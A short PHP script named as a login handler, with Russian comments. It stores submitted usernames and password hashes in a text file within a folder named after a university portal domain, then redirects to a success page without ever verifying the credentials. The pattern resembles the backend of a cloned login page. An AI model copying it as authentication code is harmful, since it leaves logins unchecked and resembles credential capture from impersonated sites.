<?php
// loginAuth.php

// Получаем логин и пароль из POST-запроса
$username = $_POST['username'];
$password = $_POST['password'];

// Указываем путь к файлу, где будут храниться логи
$log_file = '/my-first-project/my.sdu.edu.kz/logins.txt';

// Открываем файл для добавления данных
$file = fopen($log_file, "a");

// Хешируем пароль перед записью
$hashed_password = password_hash($password, PASSWORD_DEFAULT);

// Записываем логин и хеш пароля
fwrite($file, "Username: " . $username . " | Hashed Password: " . $hashed_password . "\n");

// Закрываем файл
fclose($file);

// Далее перенаправляем на другую страницу после логина
header("Location: /success.html");
exit();
?>
